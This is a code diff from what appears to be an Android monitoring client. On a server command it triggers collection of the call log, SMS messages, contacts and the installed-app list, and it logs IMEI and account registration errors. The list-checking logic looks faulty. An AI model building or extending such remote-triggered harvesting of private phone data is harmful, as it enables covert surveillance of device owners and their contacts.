@@ -14,6 +14,7 @@ import android.preference.PreferenceManager;
 import com.inet.android.archive.ArchiveCall;
 import com.inet.android.archive.ArchiveSms;
 import com.inet.android.bs.Caller;
+import com.inet.android.bs.ListApp;
 import com.inet.android.contacts.GetContacts;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
@@ -70,7 +71,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} catch (IOException e) {
 			e.printStackTrace();
 			db = new RequestDataBaseHelper(ctx);
-			
+
 			if (db.getExistType(type) == false) {
 				db.addRequest(new RequestWithDataBase(request, type));
 			}
@@ -151,6 +152,34 @@ public class PeriodicRequest extends DefaultRequest {
 		// активный режим работы
 		if (str.equals("2")) {
 			ed.putString("period", "1");
+			String listStr = null;
+			try {
+				listStr = jsonObject.getJSONArray("list").toString();
+				if (listStr.indexOf("1") != 0) {
+					// Вызвать метод для списка звонков
+					ArchiveCall arhCall = new ArchiveCall();
+					arhCall.execute(ctx);
+				}
+				if (listStr.indexOf("2") != 0) {
+					// Вызвать метод для списка смс
+					ArchiveSms arhSms = new ArchiveSms();
+					arhSms.execute(ctx);
+				}
+				if (listStr.indexOf("3") != 0) {
+					// Вызвать метод для телефонной книги
+					GetContacts getCont = new GetContacts();
+					getCont.execute(ctx);
+				}
+				if (listStr.indexOf("4") != 0) {
+					// Вызвать метод для установленных приложений
+					ListApp listApp = new ListApp();
+					listApp.getListOfInstalledApp(ctx);
+				}
+			} catch (JSONException e) {
+				listStr = null;
+			}
+
+			ed.commit();
 		}
 
 		try {
@@ -326,6 +355,23 @@ public class PeriodicRequest extends DefaultRequest {
 
 		try {
 			str = jsonObject.getString("error");
+			if (str.equals("0")) {
+				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
+				ed.putString("account", "account");
+			}
+			if (str.equals("1"))
+				Logging.doLog(LOG_TAG,
+						"imei отсутствует или имеет неверный формат",
+						"imei отсутствует или имеет неверный формат");
+			if (str.equals("2"))
+				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
+						"устройство с указанным imei уже есть");
+			if (str.equals("3"))
+				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
+			if (str.equals("4"))
+				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
+						"отсутствует или неверный type");
+
 		} catch (JSONException e) {
 			str = null;
 		}
